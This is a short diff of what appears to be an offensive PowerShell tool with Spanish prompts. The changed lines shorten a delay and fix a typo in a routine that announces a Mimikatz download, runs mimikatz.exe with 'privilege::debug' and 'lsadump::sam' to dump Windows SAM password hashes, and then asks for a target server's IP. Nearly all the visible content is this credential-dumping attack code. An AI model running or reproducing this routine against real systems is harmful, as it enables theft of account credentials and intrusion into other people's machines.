@@ -77,7 +77,7 @@ $AllProtocols = [System.Net.SecurityProtocolType]'Ssl3,Tls,Tls11,Tls12'
 
         '2' {
 	Write-Host ""
-        Write-Host "Detectando arquitectura del sistema operativo.." -ForegroundColor Magenta ; sleep -milliseconds 2500
+        Write-Host "Detectando arquitectura del sistema operativo.." -ForegroundColor Magenta ; sleep -milliseconds 1500
         Write-Host ""
 	$osarch = wmic path Win32_OperatingSystem get OSArchitecture | findstr 'bits' ; $system = $osarch.trim()
         Write-Host "Sistema de $system detectado, descargando Mimikatz.." -ForegroundColor Green 
@@ -92,7 +92,7 @@ $AllProtocols = [System.Net.SecurityProtocolType]'Ssl3,Tls,Tls11,Tls12'
 	if($system -in '32 bits') { $mimipath = ".\mimikatz\Win32\" }
 	if($system -in '64 bits') { $mimipath = ".\mimikatz\x64\" }
 	$Host.UI.RawUI.ForegroundColor = 'Yellow'
-	poershell $mimipath\mimikatz.exe "privilege::debug" "lsadump::sam" 
+	powershell $mimipath\mimikatz.exe "privilege::debug" "lsadump::sam" 
         $Host.UI.RawUI.ForegroundColor = 'Gray'
 	Write-Host ""}
         $computer = Read-Host -Prompt 'Cuál es la IP del servidor?'
